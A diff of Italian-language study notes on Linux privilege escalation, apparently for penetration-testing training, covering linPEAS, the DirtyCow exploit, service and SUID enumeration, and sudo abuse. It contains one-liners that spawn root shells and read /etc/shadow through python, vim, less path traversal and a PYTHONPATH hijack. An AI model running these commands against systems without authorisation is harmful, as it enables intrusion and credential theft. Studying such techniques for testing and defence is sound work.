@@ -1,4 +1,5 @@
 # linpeas.sh
+
 >[!important]- LinPEAS
 >Linux Privilege Escalatopm Awesome Script
 
@@ -32,4 +33,68 @@ Il modo più semplice per difendersi dagli exploit del kernel è mantenere il ke
 - scaricato l'exploit DirtyCow da qui - https://www.exploit-db.com/exploits/40839/
 - compilato ed eseguito. Sostituisce l'utente "root" con un nuovo utente "rash" modificando il file /etc/passwd.
 `$ su rash` - Cambia l'utente correntemente connesso in "rash" che è root.
-Slide 9
+## Search for exploits
+![[Pasted image 20240521143322.png|center|550]]
+### Non usare come prima scelta
+Tuttavia, è molto allettante eseguire semplicemente un exploit e ottenere l'accesso come root, ma dovresti sempre mantenerlo come ultima opzione.
+1. L'host remoto potrebbe bloccarsi poiché molti degli exploit root disponibili pubblicamente non sono molto stabili.
+2. Potresti ottenere il root e quindi mandare in crash il box.
+3. L'exploit potrebbe lasciare tracce/registri che potrebbero farti catturare.
+Dovresti sempre provare le altre tecniche per ottenere il root di cui abbiamo discusso di seguito prima di passare direttamente all'esecuzione di un exploit di root locale.
+## Servizi eseguiti come root: privilegi dei servizi
+```sh
+ps aux
+ps -ef
+top
+cat /etc/services
+ps aux | grep root
+ps -ef | grep root
+```
+
+![[Pasted image 20240521143534.png|center|600]]
+
+### Servizi di root: Applicazioni installate
+```sh
+ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+rpm -qa
+ls -alh /var/cache/<package manager>/archives
+```
+
+![[Pasted image 20240521143842.png|center|600]]
+#### Misconfigurazioni
+```sh
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk "$1 ~ /^.*r.*/
+```
+### Esempio: MySQL UDF
+## Binari Suid
+`find / -perm -4000 2>/dev/null`
+![[Pasted image 20240521144157.png|center|600]]
+### Esempio
+```sh
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+./strings /etc/shadow
+```
+#### Comandi Sudo
+`sudo -l`
+User demo may run the following commands on crashlab:
+`(root) NOPASSWD: /usr/bin/vim`
+`sudo vim -c '!sh'`
+User waldo may run the following commands on admirer:
+`(ALL) SETENV: /opt/scripts/admin_tasks.sh`
+`sudo PYTHONPATH=/dev/shm/opt/scripts/admin_tasks.sh`
+User `hacker10` may run the following commands on admirer:
+`hacker10 ALL= (root) /bin/less /var/log/*`
+` sudo less /var/log/../../etc/shadow #Read shadow`
+` sudo less /var/log/something /etc/shadow #Read 2 files`
+## Cronjobs
